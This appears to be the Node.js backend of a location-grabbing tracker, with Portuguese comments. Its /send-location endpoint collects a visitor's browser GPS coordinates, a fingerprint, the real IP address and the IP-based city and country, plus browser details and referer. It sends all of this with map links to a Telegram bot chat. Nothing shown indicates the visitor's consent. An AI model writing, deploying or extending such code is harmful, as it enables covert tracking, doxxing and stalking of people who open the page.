const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// Função auxiliar para enviar mensagem ao Telegram
async function sendToTelegram(endpoint, payload) {
  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  if (!botToken || !chatId) return;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      chat_id: chatId,
      ...payload,
    });
  } catch (err) {
    console.error("Erro ao enviar para o Telegram:", err.message);
  }
}

// Função para obter localização aproximada via IP
async function getLocationByIP(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}`);
    if (res.data.status === "success") {
      return {
        latitude: res.data.lat,
        longitude: res.data.lon,
        city: res.data.city,
        region: res.data.regionName,
        country: res.data.country,
        ip: res.data.query,
      };
    }
  } catch {}
  return null;
}

// Função para formatar o User-Agent
function parseUserAgent(ua) {
  if (!ua) return { browser: "Não identificado", os: "Não identificado" };

  let browser = "Desconhecido";
  let os = "Desconhecido";

  if (/firefox\/(\d+)/i.test(ua)) {
    const v = ua.match(/firefox\/(\d+)/i)[1];
    browser = `Firefox ${v}`;
  } else if (/chrome\/(\d+)/i.test(ua)) {
    const v = ua.match(/chrome\/(\d+)/i)[1];
    browser = `Chrome ${v}`;
  } else if (/safari\/(\d+)/i.test(ua) && !/chrome/i.test(ua)) {
    browser = "Safari";
  } else if (/edg\/(\d+)/i.test(ua)) {
    const v = ua.match(/edg\/(\d+)/i)[1];
    browser = `Edge ${v}`;
  }

  if (/windows nt/i.test(ua)) os = "Windows";
  else if (/linux/i.test(ua)) os = "Linux";
  else if (/android/i.test(ua)) os = "Android";
  else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
  else if (/mac os x/i.test(ua)) os = "MacOS";

  return { browser, os };
}

app.post("/send-location", async (req, res) => {
  let { latitude, longitude, maps, fingerprint, timestamp } = req.body;

  // Detecta IP real do cliente (Cloudflare proxied ou não)
  const clientIP =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress ||
    "";

  const locIP = await getLocationByIP(clientIP);

  // Infos extras
  const fullUrl = `${req.protocol}://${req.get("host")}${req.originalUrl}`;
  const referer = req.get("referer") || "Não disponível";
  const method = req.method;
  const userAgentHeader = req.get("user-agent") || "Não disponível";
  const parsedUA = parseUserAgent(userAgentHeader);

  const mapsGeoloc =
    latitude && longitude
      ? `https://www.google.com/maps?q=${latitude},${longitude}`
      : "Não disponível";
  const mapsIP = locIP
    ? `https://www.google.com/maps?q=${locIP.latitude},${locIP.longitude}`
    : "Não disponível";

  let text = `📍 Localização do usuário:\n\n`;

  text += `🕒 Data/Hora: ${timestamp || new Date().toLocaleString()}\n`;
  text += `🌐 URL acessada: ${fullUrl}\n`;
  text += `↩️ Referer: ${referer}\n`;
  text += `🔑 Método HTTP: ${method}\n`;
  text += `🧾 Navegador: ${parsedUA.browser}\n💻 Sistema: ${parsedUA.os}\n\n`;

  if (latitude && longitude) {
    text += `🌐 Geolocalização do navegador:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMapa: ${mapsGeoloc}\n\n`;
  } else {
    text += `🌐 Geolocalização do navegador: Não disponível\n\n`;
  }

  if (locIP) {
    text += `🖥 Localização aproximada via IP:\nLatitude: ${locIP.latitude}\nLongitude: ${locIP.longitude}\nCidade: ${locIP.city}\nRegião: ${locIP.region}\nPaís: ${locIP.country}\nIP: ${locIP.ip}\nMapa: ${mapsIP}\n\n`;
  } else {
    text += `🖥 Localização via IP: Não disponível\n\n`;
  }

  if (fingerprint) {
    text += `🔍 Fingerprint:\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
  }

  text += `🧾 User-Agent bruto:\n${userAgentHeader}`;

  await sendToTelegram("sendMessage", { text });

  if (latitude && longitude) {
    await sendToTelegram("sendLocation", { latitude, longitude });
  }

  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

